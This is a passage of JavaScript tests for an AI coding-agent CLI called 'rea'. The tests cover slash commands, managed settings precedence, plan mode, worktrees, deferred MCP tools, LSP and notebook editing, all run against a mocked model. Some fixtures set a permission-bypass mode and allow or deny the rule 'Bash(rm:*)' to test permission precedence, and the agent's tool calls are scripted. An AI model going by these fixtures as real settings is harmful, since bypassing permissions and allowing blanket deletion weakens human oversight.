    const stdin = `/cd\n/cd sub\n/cd ${cwd}\n/add-dir\n/add-dir ${other}\n/add-dir\n/rename\n/rename my session\n/session\nhi\n/config\n/exit\n`;
    const r = await runRea([], { cwd, baseURL, stdin });
    assert.equal(r.code, 0, r.err);
    assert.match(r.out, new RegExp(cwd.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')));           // bare /cd prints cwd
    assert.match(r.out, /cwd: .*\/sub/);
    assert.match(r.out, new RegExp(`cwd: ${cwd.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}$`, 'm'));
    assert.match(r.out, /\(no additional directories\)/);
    assert.match(r.out, new RegExp(`Added ${other.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')} to the workspace`));
    assert.match(r.out, new RegExp(other.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')));
    assert.match(r.out, /Usage: \/rename <title>/);
    assert.match(r.out, /Session renamed to "my session"\./);
    assert.match(r.out, /id\s+[0-9a-f-]+\n\s*file\s+.*\.jsonl\n\s*cwd\s+/);
    assert.match(r.out, /userSettings\s+.*settings\.json/);
    assert.match(r.out, /defaultMode\s+\(none\)/);
    assert.match(r.out, /permissions\s+\d+ rule\(s\) from \d+ source file\(s\)/);
  });
});

test('--managed-settings: wins defaultMode over project settings, its deny cannot be widened, /config lists it', async () => {
  const cwd = tmp();
  mkdirSync(path.join(cwd, '.rea'));
  writeFileSync(path.join(cwd, '.rea/settings.json'), JSON.stringify({ permissions: { defaultMode: 'bypassPermissions', allow: ['Bash(rm:*)'] } }));
  writeFileSync(path.join(cwd, 'managed.json'), JSON.stringify({ permissions: { defaultMode: 'default', deny: ['Bash(rm:*)'] } }));
  await withMock([reply({ type: 'text', text: 'x' })], async (baseURL) => {
    const r = await runRea(['--managed-settings', 'managed.json'], { cwd, baseURL, stdin: '/status\n/permissions\n/config\n/exit\n' });
    // mode came from managed settings ("default"), not the project's "bypassPermissions"
    assert.match(r.out, /mode\s+default/);
    assert.match(r.out, /deny\s+Bash\(rm:\*\)\s+\[managedSettings\]/);
    // the project's allow rule for the same pattern is still listed, but deny (any source) always wins
    assert.match(r.out, /allow\s+Bash\(rm:\*\)\s+\[projectSettings\]/);
    assert.match(r.out, /managedSettings\s+.*managed\.json/);
  });
});

test('plan mode end to end: enter, edit blocked, approval dialog, mode restored; AskUserQuestion; /plan', async () => {
  const cwd = tmp();
  // turn 1: EnterPlanMode -> try a write (blocked) -> ExitPlanMode(plan) -> [dialog: "2" = approve + auto-accept] -> Write allowed
  // turn 2: AskUserQuestion -> [answer "1,2"] -> final text
  const script = [
    reply(tool('p1', 'EnterPlanMode', {})),
    reply(tool('p2', 'Write', { file_path: 'blocked.txt', content: 'x' })),
    reply(tool('p3', 'ExitPlanMode', { plan: '# Plan\n1. create done.txt' })),
    reply(tool('p4', 'Write', { file_path: 'done.txt', content: 'ok' })),
    reply({ type: 'text', text: 'implemented' }),
    reply(tool('q1', 'AskUserQuestion', { questions: [{ question: 'Which formats?', header: 'Formats', multiSelect: true, options: [{ label: 'JSON', description: 'machine' }, { label: 'YAML' }, { label: 'TOML' }] }] })),
    reply({ type: 'text', text: 'noted' }),
  ];
  await withMock(script, async (baseURL, requests) => {
    const stdin = 'build the feature\n2\nwhich formats?\n1,3\n/status\n/exit\n';
    const r = await runRea([], { cwd, baseURL, stdin });
    assert.equal(r.code, 0, r.err);
    // the plan-mode reminder was in the system prompt after entering, and gone after approval
    const sysOf = (i) => requests[i].body.system.map((b) => b.text).join('\n');
    assert.doesNotMatch(sysOf(0), /Plan mode is active/);
    assert.match(sysOf(1), /# Plan mode is active/);
    assert.doesNotMatch(sysOf(4), /Plan mode is active/);
    // blocked write, then dialog, then allowed write
    assert.match(requests[2].body.messages.at(-1).content[0].content, /plan mode: only read-only tools may run/);
    assert.match(r.out, /1\) Yes, proceed \(mode: default\)/);
    assert.match(r.out, /2\) Yes, and auto-accept edits/);
    assert.equal(existsSync(path.join(cwd, 'blocked.txt')), false);
    assert.equal(readFileSync(path.join(cwd, 'done.txt'), 'utf8'), 'ok');                 // written in acceptEdits without a prompt
    assert.match(requests[3].body.messages.at(-1).content[0].content, /user approved your plan[\s\S]*create done\.txt/);
    // question dialog and its answer
    assert.match(r.out, /\[Formats\] Which formats\? \(choose several: 1,3\)/);
    assert.match(r.out, /3\) TOML/);
    assert.match(r.out, /4\) Other \(type your answer\)/);
    assert.match(requests[6].body.messages.at(-1).content[0].content, /=> JSON, TOML/);
    assert.match(r.out, /mode\s+acceptEdits/);
  });

  // rejection with typed feedback keeps plan mode; /plan toggles
  await withMock([
    reply(tool('p1', 'ExitPlanMode', { plan: 'v1' })),
    reply({ type: 'text', text: 'revising' }),
  ], async (baseURL, requests) => {
    const r = await runRea([], { cwd, baseURL, stdin: '/plan\nplan something\nuse sqlite instead\n/status\n/plan off\n/status\n/exit\n' });
    assert.equal(r.code, 0, r.err);
    assert.match(r.out, /Plan mode on/);
    assert.match(requests[1].body.messages.at(-1).content[0].content, /did not approve.*use sqlite instead/s);
    assert.match(r.out, /mode\s+plan/);
    assert.match(r.out, /Plan mode off \(mode: default\)/);
  });
});

test('--output-schema: StructuredOutput tool is registered and its final call is printed as JSON in print mode', async () => {
  const cwd = tmp();
  writeFileSync(path.join(cwd, 'schema.json'), JSON.stringify({ type: 'object', required: ['summary'], properties: { summary: { type: 'string' } } }));
  await withMock([
    reply(tool('s1', 'StructuredOutput', { summary: 'all good' })),
  ], async (baseURL, requests) => {
    const r = await runRea(['--output-schema', 'schema.json', '--no-persist', '-p', 'summarize'], { cwd, baseURL });
    assert.equal(r.code, 0, r.err);
    assert.ok(requests[0].body.tools.some((t) => t.name === 'StructuredOutput'));
    const sys = requests[0].body.system.map((b) => b.text).join('\n');
    assert.match(sys, /You MUST call it exactly once/);
    assert.match(r.out, /"summary": "all good"/);
  });
});

test('worktree tools through the real CLI: create, switch, write, return, remove', async () => {
  const cwd = tmp();
  const { execFileSync } = await import('node:child_process');
  execFileSync('git', ['init', '-q'], { cwd });
  execFileSync('git', ['config', 'user.email', 'a@b.c'], { cwd });
  execFileSync('git', ['config', 'user.name', 'rea'], { cwd });
  writeFileSync(path.join(cwd, 'a.txt'), 'orig\n');
  execFileSync('git', ['add', '.'], { cwd });
  execFileSync('git', ['commit', '-q', '-m', 'init'], { cwd });

  await withMock([
    reply(tool('e1', 'EnterWorktree', { branch: 'feature' })),
    reply(tool('w1', 'Write', { file_path: 'b.txt', content: 'from the worktree' })),
    reply(tool('x1', 'ExitWorktree', {})),
    reply({ type: 'text', text: 'done' }),
  ], async (baseURL, requests) => {
    const r = await runRea(['--permission-mode', 'bypassPermissions', '--no-persist', '-p', 'make a worktree'], { cwd, baseURL });
    assert.equal(r.code, 0, r.err);
    assert.match(requests[1].body.messages.at(-1).content[0].content, /Entered worktree/);
    assert.match(requests[3].body.messages.at(-1).content[0].content, /Returned to/);
    // the file written while in the worktree must NOT leak into the original checkout, and the worktree is gone afterwards
    assert.equal(existsSync(path.join(cwd, 'b.txt')), false);
    const worktreesDir = `${cwd}.worktrees`;
    assert.equal(existsSync(worktreesDir) && readdirSync(worktreesDir).length > 0, false);
  });
});

test('--defer-mcp-tools: schemas withheld until ToolSearch unlocks them, then callable', async () => {
  const cwd = tmp();
  const server = { command: process.execPath, args: [path.resolve('test/fixtures/mock-mcp-server.mjs')] };
  writeFileSync(path.join(cwd, 'mcp.json'), JSON.stringify({ mcpServers: { mock: server } }));
  await withMock([
    reply(tool('t1', 'ToolSearch', { query: 'select:mcp__mock__echo' })),
    reply(tool('t2', 'mcp__mock__echo', { text: 'hi' })),
    reply({ type: 'text', text: 'done' }),
  ], async (baseURL, requests) => {
    const r = await runRea(['--mcp-config', 'mcp.json', '--defer-mcp-tools', '--allowedTools', 'mcp__mock', '--no-persist', '-p', 'use mcp'], { cwd, baseURL });
    assert.equal(r.code, 0, r.err);
    assert.ok(!requests[0].body.tools.some((t) => t.name === 'mcp__mock__echo'));      // withheld on the first request
    assert.ok(requests[0].body.tools.some((t) => t.name === 'ToolSearch'));
    const sys0 = requests[0].body.system.map((b) => b.text).join('\n');
    assert.match(sys0, /mcp__mock__echo/);                                            // named in the reminder
    assert.ok(requests[1].body.tools.some((t) => t.name === 'mcp__mock__echo'));       // unlocked for the call right after ToolSearch
    assert.equal(requests[2].body.messages.at(-1).content[0].content, 'echo: hi');     // result of the now-unlocked tool call
  });
});

test('LSP tool through the real CLI: documentSymbol and definition against a mock language server', async () => {
  const cwd = tmp();
  writeFileSync(path.join(cwd, 'a.ts'), 'function foo() {}\nfoo();\n');
  writeFileSync(path.join(cwd, 'lsp.json'), JSON.stringify({ servers: { '.ts': { command: process.execPath, args: [path.resolve('test/fixtures/mock-lsp-server.mjs')] } } }));
  await withMock([
    reply(tool('l1', 'LSP', { action: 'documentSymbol', file_path: 'a.ts' })),
    reply(tool('l2', 'LSP', { action: 'definition', file_path: 'a.ts', line: 2, symbol: 'foo' })),
    reply({ type: 'text', text: 'done' }),
  ], async (baseURL, requests) => {
    const r = await runRea(['--allowedTools', 'LSP', '--lsp-config', 'lsp.json', '--no-persist', '-p', 'inspect a.ts'], { cwd, baseURL });
    assert.equal(r.code, 0, r.err);
    assert.ok(requests[0].body.tools.some((t) => t.name === 'LSP'));
    assert.match(requests[1].body.messages.at(-1).content[0].content, /foo \(function\)/);
  });
});

test('NotebookRead/NotebookEdit through the real CLI: read, edit a cell, insert one, permission alias to Edit', async () => {
  const cwd = tmp();
  const nb = { nbformat: 4, metadata: { kernelspec: { language: 'python' } },
    cells: [{ id: 'c1', cell_type: 'code', source: ['x = 1'], metadata: {}, execution_count: null, outputs: [] }] };
  writeFileSync(path.join(cwd, 'nb.ipynb'), JSON.stringify(nb));
  mkdirSync(path.join(cwd, '.rea'));
  writeFileSync(path.join(cwd, '.rea/settings.json'), JSON.stringify({ permissions: { allow: ['NotebookRead', 'Edit(./nb.ipynb)'] } }));
  await withMock([
    reply(tool('r1', 'NotebookRead', { notebook_path: 'nb.ipynb' })),
    reply(tool('e1', 'NotebookEdit', { notebook_path: 'nb.ipynb', cell_id: 'c1', new_source: 'x = 2', edit_mode: 'replace' })),
    reply(tool('e2', 'NotebookEdit', { notebook_path: 'nb.ipynb', cell_type: 'markdown', new_source: '# header', edit_mode: 'insert' })),
    reply({ type: 'text', text: 'done' }),
  ], async (baseURL, requests) => {
    const r = await runRea(['-p', 'edit the notebook'], { cwd, baseURL });
    assert.equal(r.code, 0, r.err);
    const res = (i) => requests[i].body.messages.at(-1).content[0];
    assert.match(res(1).content, /x = 1/);
    assert.match(res(2).content, /Replaced cell c1/);
    assert.equal(res(3).is_error, undefined);
    assert.match(res(3).content, /Inserted a new markdown cell at the start/);
    const onDisk = JSON.parse(readFileSync(path.join(cwd, 'nb.ipynb'), 'utf8'));
    assert.equal(onDisk.cells.length, 2);
    assert.deepEqual(onDisk.cells[0].source, ['# header']);
    assert.deepEqual(onDisk.cells[1].source, ['x = 2']);
  });
});
